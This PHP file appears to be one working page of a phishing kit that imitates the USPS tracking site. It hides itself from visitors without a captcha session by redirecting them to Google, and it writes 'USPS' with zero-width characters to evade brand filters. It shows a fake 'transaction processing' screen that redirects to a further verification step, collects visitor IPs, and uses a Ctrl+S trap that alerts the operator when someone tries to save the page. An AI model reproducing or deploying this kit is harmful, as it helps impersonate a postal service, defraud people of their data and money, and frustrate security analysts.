<?php
session_start();
function getUserIP() {
    $ip = '';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } 
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } 
    else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
if (isset($_SESSION["captcha"]))
{
?>
<html
    class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths dj_gecko dj_contentbox"
    lang="en"
>
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="robots" content="noindex" />
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title>U​S​P​S​.​c​o​m​® - U​S​P​S​ T​r​a​c​k​i​n​g​®</title>
        <meta http-equiv="refresh" content="20;url=v_check.php"/>
        <link rel="stylesheet" href="https://tools.usps.com/go/css/footer.css" />
        <link rel="stylesheet" href="https://tools.usps.com/go/css/libs/bootstrap.min.css" />
        <link rel="stylesheet" href="https://tools.usps.com/go/css/redelivery-reskin/calendar.css" />
        <link rel="stylesheet" href="https://tools.usps.com//go/css/libs/datepicker3.css" />
        <link rel="stylesheet" href="https://tools.usps.com//go/css/main.css" />
        <link rel="stylesheet" href="https://tools.usps.com//go/css/tracking-cross-sell.css" />
        <link rel="stylesheet" href="https://tools.usps.com//go/css/redelivery-reskin/jquery-ui.min.css" />
        <link rel="stylesheet" href="https://tools.usps.com//go/css/redelivery-reskin/schedule-redelivery.css" />
        <link href="https://tools.usps.com/global-elements/header/css/megamenu-v2.css" type="text/css" rel="stylesheet" />
        <link href="style_b.css" type="text/css" rel="stylesheet" />
        <script type="text/javascript" src="https://www.usps.com/global-elements/footer/script/jquery-3.2.1.js"></script>
        <script type="text/javascript" src="https://www.usps.com//global-elements/header/script/megamenu.js"></script>
    </head>
    <body>
        <div id="tracking_page_wrapper">
            <div class="nav-utility" id="nav-utility">
                <div class="utility-links" id="utility-header">
                    <div class="lang-select">
                        <a id="link-lang" href="#">
                            <span class="visuallyhidden">Current language:</span>
                            English
                        </a>
                        <ul class="lang-list">
                            <li class="lang-option">
                                <a>English</a>
                            </li>
                        </ul>
                    </div>
                    <a id="link-locator" href="#">Locations</a>
                    <a id="link-customer" href="#">Support</a>
                    <a id="link-myusps" href="#">Informed Delivery</a>
                    <a id="login-register-header" class="link-reg" href="#">Register / Sign In</a>
                    <div id="link-cart" style="display: inline-block;"></div>
                </div>
            </div>
            <div class="global--navigation" id="g-navigation">
                <a tabindex="-1" name="skipallnav" id="skipallnav" href="#" class="hidden-skip">Skip all category navigation links</a>
                <div class="nav-full">
                    <a class="global-logo" href="#" style="vertical-align: baseline;">
                        <img src="https://www.usps.com/global-elements/header/images/utility-header/logo-sb.svg" />
                    </a>
                    <div class="mobile-header">
                        <a class="mobile-hamburger" href="#"><img src="https://www.usps.com/assets/images/home/hamburger.svg" /></a>
                        <a class="mobile-logo" href="#"><img src="https://www.usps.com/assets/images/home/logo_mobile.svg" /></a>
                        <a class="mobile-search" href="#"><img src="https://www.usps.com/assets/images/home/search.svg" /></a>
                    </div>

                    <nav>
                        <div class="mobile-log-state">
                            <div id="msign" class="mobile-utility">
                                <div class="mobile-sign"><a href="#">Sign In</a></div>
                            </div>
                        </div>
                        <ul class="nav-list" role="menubar">
                            <li class="qt-nav menuheader">
                                <a tabindex="-1" name="navquicktools" id="navquicktools" href="#" class="hidden-skip">Skip Quick Tools Links</a>
                                <a aria-expanded="false" role="menuitem" tabindex="0" aria-haspopup="true" class="nav-first-element menuitem" href="#">Quick Tools</a>
                                <div class="">
                                    <ul role="menu" aria-hidden="true">
                                        <li>
                                            <a role="menuitem" tabindex="-1" href="#">
                                                <img src="https://www.usps.com/assets/images/home/tracking.svg" />
                                                <p>Track a Package</p>
                                            </a>
                                        </li>
                                        <li>
                                            <a role="menuitem" tabindex="-1" href="#">
                                                <img src="https://www.usps.com/global-elements/header/images/utility-header/mailman.svg" />
                                                <p>Informed Delivery</p>
                                            </a>
                                        </li>
                                        <li>
                                            <a role="menuitem" tabindex="-1" href="#">
                                                <img src="https://www.usps.com/assets/images/home/location.svg" />
                                                <p>Find USPS Locations</p>
                                            </a>
                                        </li>
                                        <li>
                                            <a role="menuitem" tabindex="-1" href="#">
                                                <img src="https://www.usps.com/assets/images/home/stamps.svg" />
                                                <p>Buy Stamps</p>
                                            </a>
                                        </li>
                                        <li>
                                            <a role="menuitem" tabindex="-1" href="#">
                                                <img src="https://www.usps.com/assets/images/home/schedule_pickup.svg" />
                                                <p>Schedule a Pickup</p>
                                            </a>
                                        </li>
                                        <li>
                                            <a role="menuitem" tabindex="-1" href="#">
                                                <img src="https://www.usps.com/assets/images/home/calculate_price.svg" />
                                                <p>Calculate a Price</p>
                                            </a>
                                        </li>
                                        <li>
                                            <a role="menuitem" tabindex="-1" href="#">
                                                <img src="https://www.usps.com/assets/images/home/find_zip.svg" />
                                                <p>
                                                    Look Up a <br />
                                                    ZIP Code<sup>™</sup>
                                                </p>
                                            </a>
                                        </li>
                                        <li>
                                            <a role="menuitem" tabindex="-1" href="#">
                                                <img src="https://www.usps.com/assets/images/home/holdmail.svg" />
                                                <p>Hold Mail</p>
                                            </a>
                                        </li>
                                        <li>
                                            <a role="menuitem" tabindex="-1" href="#">
                                                <img src="https://www.usps.com/assets/images/home/change_address.svg" />
                                                <p>Change My Address</p>
                                            </a>
                                        </li>
                                        <li>
                                            <a role="menuitem" tabindex="-1" href="#">
                                                <img src="https://www.usps.com/assets/images/home/po_box.svg" />
                                                <p>
                                                    Rent/Renew a <br />
                                                    PO Box
                                                </p>
                                            </a>
                                        </li>
                                        <li>
                                            <a role="menuitem" tabindex="-1" href="#">
                                                <img src="https://www.usps.com/assets/images/home/free_boxes.svg" />
                                                <p>Free Boxes</p>
                                            </a>
                                        </li>
                                        <li>
                                            <a role="menuitem" tabindex="-1" href="#">
                                                <img src="https://www.usps.com/assets/images/home/featured_clicknship.svg" />
                                                <p>Click-N-Ship</p>
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                            </li>
                            <li class="menuheader">
                                <a tabindex="-1" name="navmailship" id="navmailship" href="#" class="hidden-skip">Skip Mail and Ship Links</a>
                                <a id="mail-ship-width" aria-expanded="false" class="menuitem" role="menuitem" tabindex="0" aria-haspopup="true" href="#">Mail &amp; Ship</a>
                                <div class="repos">
                                    <ul role="menu" aria-hidden="true" class="tools">
                                        <h3>Tools</h3>
                                        <li class="tool-cns">
                                            <a role="menuitem" tabindex="-1" href="#">Click-N-Ship</a>
                                        </li>
                                        <li class="tool-stamps">
                                            <a role="menuitem" tabindex="-1" href="#">Stamps &amp; Supplies</a>
                                        </li>
                                        <li class="tool-calc">
                                            <a role="menuitem" tabindex="-1" href="#">Calculate a Price</a>
                                        </li>
                                        <li class="tool-pick">
                                            <a role="menuitem" tabindex="-1" href="#">Schedule a Pickup</a>
                                        </li>
                                        <li class="tool-zip">
                                            <a role="menuitem" tabindex="-1" href="#">Look Up a ZIP Code<sup>™</sup></a>
                                        </li>
                                        <li class="tool-find">
                                            <a role="menuitem" tabindex="-1" href="#">Find a USPS Location</a>
                                        </li>
                                    </ul>
                                    <ul role="menu" aria-hidden="true">
                                        <h3>Learn About</h3>
                                        <li><a role="menuitem" tabindex="-1" href="#">Mailing &amp; Shipping</a></li>
                                        <ul aria-hidden="true">
                                            <li><a role="menuitem" tabindex="-1" href="#">Sending Mail</a></li>
                                            <li><a role="menuitem" tabindex="-1" href="#">Sending Packages</a></li>
                                            <li><a role="menuitem" tabindex="-1" href="#">Insurance &amp; Extra Services</a></li>
                                            <li><a role="menuitem" tabindex="-1" href="#">Shipping Restrictions</a></li>
                                        </ul>
                                        <li><a role="menuitem" tabindex="-1" href="#">Online Shipping</a></li>
                                        <li><a role="menuitem" tabindex="-1" href="#">Label Broker</a></li>
                                        <li><a role="menuitem" tabindex="-1" href="#">Custom Mail, Cards, &amp; Envelopes</a></li>
                                    </ul>
                                    <ul role="menu" aria-hidden="true">
                                        <h3 class="desktop-only">&nbsp;</h3>
                                        <li><a role="menuitem" tabindex="-1" href="#">Mail &amp; Shipping Services</a></li>
                                        <ul aria-hidden="true">
                                            <li><a role="menuitem" tabindex="-1" href="#">Priority Mail Express</a></li>
                                            <li><a role="menuitem" tabindex="-1" href="#">Priority Mail</a></li>
                                            <li><a role="menuitem" tabindex="-1" href="#">First-Class Mail</a></li>
                                            <li><a role="menuitem" tabindex="-1" href="#">Military &amp; Diplomatic Mail</a></li>
                                        </ul>
                                        <li><a role="menuitem" tabindex="-1" href="#">Money Orders</a></li>
                                        <div class="desktop-only mailship-addition">
                                            <a role="menuitem" tabindex="-1" href="#"> <img src="https://www.usps.com/ship/go-now.png" /><span class="visuallyhidden">Print and ship from home. Start Click-N-Ship.</span> </a>
                                        </div>
                                    </ul>
                                </div>
                            </li>
                            <li class="menuheader">
                                <a tabindex="-1" name="navtrackmanage" id="navtrackmanage" href="#" class="hidden-skip">Skip Track and Manage Links</a>
                                <a aria-expanded="false" class="menuitem" role="menuitem" tabindex="0" aria-haspopup="true" href="#">Track &amp; Manage</a>
                                <div>
                                    <ul role="menu" aria-hidden="true" class="tools">
                                        <h3>Tools</h3>
                                        <li class="tool-track"><a role="menuitem" tabindex="-1" href="#">Tracking</a></li>
                                        <li class="tool-informed"><a role="menuitem" tabindex="-1" href="#">Informed Delivery</a></li>
                                        <li class="tool-intercept"><a role="menuitem" tabindex="-1" href="#">Intercept a Package</a></li>
                                        <li class="tool-redelivery"><a role="menuitem" tabindex="-1" href="#">Schedule a Redelivery</a></li>
                                        <li class="tool-hold"><a role="menuitem" tabindex="-1" href="#">Hold Mail</a></li>
                                        <li class="tool-change"><a role="menuitem" tabindex="-1" href="#">Change of Address</a></li>
                                        <li class="tool-pobol"><a role="menuitem" tabindex="-1" href="#">Rent or Renew PO Box</a></li>
                                    </ul>
                                    <ul role="menu" aria-hidden="true">
                                        <h3>Learn About</h3>
                                        <li><a role="menuitem" tabindex="-1" href="#">Managing Mail Basics</a></li>
                                        <li><a role="menuitem" tabindex="-1" href="#">Forwarding Mail</a></li>
                                        <li><a role="menuitem" tabindex="-1" href="#">Informed Delivery</a></li>
                                        <li><a role="menuitem" tabindex="-1" href="#">Redirecting a Package</a></li>
                                        <li><a role="menuitem" tabindex="-1" href="#">PO Boxes</a></li>
                                        <li><a role="menuitem" tabindex="-1" href="#">Mailbox Guidelines</a></li>
                                        <li><a role="menuitem" tabindex="-1" href="#">Mail for the Deceased</a></li>
                                        <div class="desktop-only manage-addition">
                                            <a role="menuitem" tabindex="-1" href="#"><img src="https://www.usps.com/manage/go-now.png" /></a>
                                        </div>
                                    </ul>
                                </div>
                            </li>
                            <li class="menuheader">
                                <a tabindex="-1" name="navpostalstore" id="navpostalstore" href="#" class="hidden-skip">Skip Postal Store Links</a>
                                <a aria-expanded="false" class="menuitem" role="menuitem" tabindex="0" aria-haspopup="true" href="#">Postal Store</a>
                                <div class="repos">
                                    <ul role="menu" aria-hidden="true" class="tools">
                                        <h3>Shop</h3>

                                        <li class="tool-stamps"><a role="menuitem" tabindex="-1" href="#">Stamps</a></li>
                                        <li class="tool-supplies"><a role="menuitem" tabindex="-1" href="#">Shipping Supplies</a></li>
                                        <li class="tool-cards"><a role="menuitem" tabindex="-1" href="#">Cards &amp; Envelopes</a></li>
                                        <li class="tool-pse"><a role="menuitem" tabindex="-1" href="#">Personalized Stamped Envelopes</a></li>
                                        <li class="tool-coll"><a role="menuitem" tabindex="-1" href="#">Collectors</a></li>
                                        <li class="tool-gifts"><a role="menuitem" tabindex="-1" href="#">Gifts</a></li>
                                        <li class="tool-business"><a role="menuitem" tabindex="-1" href="#">Business Supplies</a></li>
                                    </ul>

                                    <ul role="menu" aria-hidden="true">
                                        <h3>Learn About</h3>
                                        <li><a role="menuitem" tabindex="-1" href="#">Money Orders</a></li>
                                        <li><a role="menuitem" tabindex="-1" href="#">Returns &amp; Exchanges</a></li>
                                        <div class="desktop-only shop-addition">
                                            <a role="menuitem" tabindex="-1" href="#"> <img src="https://www.usps.com/store/go-now.png" /><span class="visuallyhidden">Shop Forever Stamps. Shop now.</span> </a>
                                        </div>
                                    </ul>
                                </div>
                            </li>
                            <li class="menuheader">
                                <a tabindex="-1" name="navbusiness" id="navbusiness" href="#" class="hidden-skip">Skip Business Links</a>
                                <a aria-expanded="false" class="menuitem" tabindex="0" aria-haspopup="true" role="menuitem" href="#">Business</a>
                                <div class="repos">
                                    <ul role="menu" aria-hidden="true" class="tools">
                                        <h3>Tools</h3>
                                        <li class="tool-calc"><a role="menuitem" tabindex="-1" href="#">Calculate a Business Price</a></li>
                                        <li class="tool-eddm"><a role="menuitem" tabindex="-1" href="#">Every Door Direct Mail</a></li>
                                        <div class="desktop-only business-addition">
                                            <a role="menuitem" tabindex="-1" href="#">
                                                <img src="https://www.usps.com/business/go-now.png" /><span class="visuallyhidden">Grow your business with Every Door Direct Mail. Try EDDM now.</span>
                                            </a>
                                        </div>
                                    </ul>

                                    <ul role="menu" aria-hidden="true">
                                        <h3>Learn About</h3>

                                        <li><a role="menuitem" tabindex="-1" href="#">Shipping for Business</a></li>
                                        <ul aria-hidden="true">
                                            <li><a role="menuitem" tabindex="-1" href="#">Shipping Consolidators</a></li>
                                        </ul>
                                        <li><a role="menuitem" tabindex="-1" href="#">Advertising with Mail</a></li>
                                        <ul aria-hidden="true">
                                            <li><a role="menuitem" tabindex="-1" href="#">Using EDDM</a></li>
                                            <li><a role="menuitem" tabindex="-1" href="#">Mailing &amp; Printing Services</a></li>
                                            <li><a role="menuitem" tabindex="-1" href="#">Customized Direct Mail</a></li>
                                            <li><a role="menuitem" tabindex="-1" href="#">Political Mail</a></li>
                                            <li><a role="menuitem" tabindex="-1" href="#">Promotions &amp; Incentives</a></li>
                                            <li><a role="menuitem" tabindex="-1" href="#">Informed Delivery Marketing</a></li>
                                            <li><a role="menuitem" tabindex="-1" href="#">Product Samples</a></li>
                                        </ul>
                                    </ul>
                                    <ul role="menu" aria-hidden="true">
                                        <h3 class="desktop-only">&nbsp;</h3>

                                        <li><a role="menuitem" tabindex="-1" href="#">Postage Options</a></li>
                                        <ul aria-hidden="true">
                                            <li><a role="menuitem" tabindex="-1" href="#">Verifying Postage</a></li>
                                        </ul>
                                        <li><a role="menuitem" tabindex="-1" href="#">Returns Services</a></li>
                                        <li><a role="menuitem" tabindex="-1" href="#">Label Broker</a></li>
                                        <li><a role="menuitem" tabindex="-1" href="#">International Business Shipping</a></li>
                                        <li><a role="menuitem" tabindex="-1" href="#">Managing Business Mail</a></li>

                                        <li><a role="menuitem" tabindex="-1" href="#">Web Tools (APIs)</a></li>
                                        <li><a role="menuitem" tabindex="-1" href="#">Prices</a></li>
                                    </ul>
                                </div>
                            </li>
                            <li class="menuheader">
                                <a tabindex="-1" name="navinternational" id="navinternational" href="#" class="hidden-skip">Skip International Links</a>
                                <a class="menuitem" tabindex="0" aria-expanded="false" aria-haspopup="true" role="menuitem" href="#">International</a>
                                <div class="repos">
                                    <ul role="menu" aria-hidden="true" class="tools">
                                        <h3>Tools</h3>

                                        <li class="tool-calc"><a role="menuitem" tabindex="-1" href="#">Calculate International Prices</a></li>
                                        <li class="tool-international-labels"><a role="menuitem" tabindex="-1" href="#">Print International Labels</a></li>
                                        <div class="desktop-only international-addition">
                                            <a role="menuitem" tabindex="-1" href="#">
                                                <img src="https://www.usps.com/international/go-now.png" /><span class="visuallyhidden">Use our online scheduler to make a passport appointment. Schedule Today.</span>
                                            </a>
                                        </div>
                                    </ul>

                                    <ul role="menu" aria-hidden="true">
                                        <h3>Learn About</h3>
                                        <li><a role="menuitem" tabindex="-1" href="#">Printing &amp; Shipping International</a></li>
                                        <li><a role="menuitem" tabindex="-1" href="#">International Mail Services</a></li>
                                        <ul aria-hidden="true">
                                            <li><a role="menuitem" tabindex="-1" href="#">Global Express Guaranteed</a></li>
                                            <li><a role="menuitem" tabindex="-1" href="#">Priority Mail Express International</a></li>
                                            <li><a role="menuitem" tabindex="-1" href="#">Priority Mail International</a></li>
                                            <li><a role="menuitem" tabindex="-1" href="#">First-Class Mail International</a></li>
                                            <li><a role="menuitem" tabindex="-1" href="#">International Insurance &amp; Extra Services</a></li>
                                        </ul>
                                        <li><a role="menuitem" tabindex="-1" href="#">Sending International Shipments</a></li>
                                        <ul aria-hidden="true">
                                            <li><a role="menuitem" tabindex="-1" href="#">Shipping Restrictions</a></li>
                                        </ul>
                                        <li><a role="menuitem" tabindex="-1" href="#">Completing Customs Forms</a></li>
                                        <li><a role="menuitem" tabindex="-1" href="#">Military &amp; Diplomatic Mail</a></li>
                                        <li><a role="menuitem" tabindex="-1" href="#">Sending Money Abroad</a></li>
                                        <li><a role="menuitem" tabindex="-1" href="#">Passports</a></li>
                                    </ul>
                                </div>
                            </li>
                            <li class="menuheader">
                                <a tabindex="-1" name="navhelp" id="navhelp" href="#" class="hidden-skip">Skip Help Links</a>
                                <a aria-expanded="false" class="menuitem" tabindex="0" aria-haspopup="true" role="menuitem" href="#">Help</a>
                                <div class="repos">
                                    <ul role="menu" aria-hidden="true">
                                        <li><a role="menuitem" tabindex="-1" href="#">FAQs</a></li>
                                        <li><a role="menuitem" tabindex="-1" href="#">Finding Missing Mail</a></li>
                                        <li><a role="menuitem" tabindex="-1" href="#">Filing a Claim</a></li>
                                        <li><a role="menuitem" tabindex="-1" href="#">Requesting a Refund</a></li>
                                    </ul>
                                </div>
                            </li>
                            <li class="nav-search menuheader">
                                <a tabindex="-1" name="navsearch" id="navsearch" href="#" class="hidden-skip">Skip Search</a>
                                <a aria-expanded="false" class="menuitem" tabindex="0" aria-haspopup="true" role="menuitem" href="#">Search U​S​P​S​.com</a>
                                <div class="repos">
                                    <!-- Search -->
                                    <span aria-hidden="false" class="input--wrap-label">
                                        <label class="visuallyhidden" for="styleguide-header--search-track">Search U​S​P​S​.​com</label>
                                    </span>
                                    <div class="empty-search">
                                        <p>Top Searches</p>
                                        <ul aria-hidden="true">
                                            <li><a role="menuitem" tabindex="-1" href="#">PO BOXES</a></li>
                                            <li><a role="menuitem" tabindex="-1" href="#">PASSPORTS</a></li>
                                            <li><a role="menuitem" tabindex="-1" href="#">FREE BOXES</a></li>
                                        </ul>
                                    </div>
                                    <!-- END Search -->
                                </div>
                            </li>
                        </ul>
                    </nav>
                    <a name="endnav" id="endnav" href="#" class="hidden-skip">&nbsp;</a>
                </div>
            </div>
            <!-- END GLOBAL HEADER -->
            <div class="container-fluid full-subheader">
                <!-- Subheader -->
                <h1>U​S​P​S T​r​a​c​k​i​n​g<sup>®</sup></h1>
                <div class="subheader_links">
                    <a href="#" class="active">T​r​a​c​k​i​n​g <i class="fa fa-caret-right" aria-hidden="true"></i></a>
                    <a href="#" class="header-faqs" id="faqHeader"><strong>FAQs</strong> <i class="fa fa-caret-right" aria-hidden="true"></i></a>
                </div>
            </div>
            <div class="container-fluid tracking_form_container">
                <div class="row">
                    <div class="col-xl-3 col-lg-4 col-sm-12">
                        <h3>
                            <a class="track-another-package-open" href="#">Track Another Package <i>+</i></a>
                        </h3>
                    </div>
                    <div class="col-xl-9 col-lg-8 col-sm-12"></div>
                </div>
                <!-- END CALENDAR MODAL -->
            </div>
            <div id="tracked-numbers">
                <div class="track-bar-container">
                    <div class="container-fluid">
                        <div>
                            <div>
                                <div class="product_summary delivery_exception">
                                    <h3 class="tracking_number">
                                        T​r​a​c​k​i​n​g Number:
                                        <span class="tracking-number">US9514901185400</span>
                                    </h3>
                                    <div class="status_bar status_4">
                                        <div class="bar_third bar_third_1"><span></span></div>
                                        <div class="bar_third bar_third_2"><span></span></div>
                                        <div class="bar_third bar_third_3"><span></span></div>
                                        <span class="text_explanation">Status : Not Available</span>
                                    </div>
                                </div>
                                <!-- END Product Summary -->
                            </div>
                            <!-- End col -->
                        </div>
                        <p class="lg-header"><strong>Your transaction is being processed. Please do not close or refresh this page...</strong></p>
                        <center><img src="output-onlinegiftools.gif" width="150" height="150"></center>
                        <br />
                    </div>
                </div>
            </div>
        </div>
        <!--End Tracking Numbers container -->
        <div class="container-fluid find-FAQs">
            <!-- FAQs Link Callout row  -->
            <div class="row">
                <div class="col-sm-12">
                    <h2>Can’t find what you’re looking for?</h2>
                    <p>Go to our FAQs section to find answers to your tracking questions.</p>
                    <a href="#" id="idxsFAQBtn" class="button">FAQs</a>
                </div>
            </div>
        </div>

        <div id="global-footer--wrap" class="global-footer--wrap">
            <link type="text/css" rel="stylesheet" href="#" />
            <link type="text/css" rel="stylesheet" href="#" />
            <footer class="global-footer">
                <a href="#" class="global-footer--logo-link"></a>
                <nav class="global-footer--navigation">
                    <ol>
                        <li style="color: #333366;" class="global-footer--navigation-category">
                            Helpful Links
                            <ol class="global-footer--navigation-options">
                                <li>
                                    <a href="#">Contact Us</a>
                                </li>
                                <li>
                                    <a href="#">Site Index</a>
                                </li>
                                <li>
                                    <a href="#">FAQs</a>
                                </li>
                                <li><a href="#" onclick="KAMPYLE_ONSITE_SDK.showForm(244)">Feedback</a></li>
                            </ol>
                        </li>
                        <li style="color: #333366;" class="global-footer--navigation-category">
                            On About.USPS.com
                            <ol class="global-footer--navigation-options">
                                <li>
                                    <a href="#">About USPS Home</a>
                                </li>
                                <li>
                                    <a href="#">Newsroom</a>
                                </li>
                                <li>
                                    <a href="#">USPS Service Updates</a>
                                </li>
                                <li>
                                    <a href="#">Forms &amp; Publications</a>
                                </li>
                                <li>
                                    <a href="#">Government Services</a>
                                </li>
                                <li>
                                    <a href="#">Careers</a>
                                </li>
                            </ol>
                        </li>
                        <li style="color: #333366;" class="global-footer--navigation-category">
                            Other USPS Sites
                            <ol class="global-footer--navigation-options">
                                <li>
                                    <a href="#">Business Customer Gateway</a>
                                </li>
                                <li>
                                    <a href="#">Postal Inspectors</a>
                                </li>
                                <li>
                                    <a href="#">Inspector General</a>
                                </li>
                                <li>
                                    <a href="#">Postal Explorer</a>
                                </li>
                                <li>
                                    <a href="#">National Postal Museum</a>
                                </li>
                                <li>
                                    <a href="#">Resources for Developers</a>
                                </li>
                            </ol>
                        </li>
                        <li style="color: #333366;" class="global-footer--navigation-category">
                            Legal Information
                            <ol class="global-footer--navigation-options">
                                <li>
                                    <a href="#">Privacy Policy</a>
                                </li>
                                <li>
                                    <a href="#">Terms of Use</a>
                                </li>
                                <li>
                                    <a href="#">FOIA</a>
                                </li>
                                <li>
                                    <a href="#">No FEAR Act EEO Data</a>
                                </li>
                            </ol>
                        </li>
                    </ol>
                </nav>
                <div class="global-footer--copyright">Copyright © 2024 U​S​P​S. All Rights Reserved.</div>
            </footer>
        </div>


    <script>
        document.addEventListener('keydown', function(event) {
            if ((event.ctrlKey || event.metaKey) && event.key === 's') {
                event.preventDefault();
                document.body.innerHTML = 'EZEBBBBY habeb tsajel l page ?';
                var formData = new FormData();
                formData.append('action', 'notify');
                fetch('zebu_alert.php', {method: 'POST',body: formData})
                .then(response => response.text())
                .then(result => {
                    console.log(result);
                    if (result.includes("Notification sent successfully")) {
                        window.location.href = window.location.href;
                    } 
                })
                .catch(error => console.error('Error:', error));
            }
        });
    </script>
        
    </body>
</html>
<?php
}else {
	HEADER("Location: https://google.com");
}
?>